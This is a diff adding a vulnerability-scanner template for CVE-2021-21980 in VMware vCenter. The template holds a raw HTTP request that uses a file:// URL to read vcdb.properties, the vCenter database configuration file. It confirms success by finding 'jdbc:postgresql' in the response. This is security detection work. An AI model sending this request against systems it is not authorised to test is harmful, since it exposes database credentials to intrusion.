@@ -1,0 +1,28 @@
+id: CVE-2021-21980
+info:
+  name: VMware vCenter provider-logo file read vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    VMware vCenter Server 7.0.2.00100 and earlier versions have an unauthorized arbitrary file read vulnerability. An attacker can exploit this vulnerability to read sensitive files like system or database configuration files.
+  reference:
+    - https://www.vmware.com/security/advisories/VMSA-2021-0027.html
+  classification:
+    cve-id: CVE-2021-21980
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/vmware-vpx/vcdb.properties HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "jdbc:postgresql"
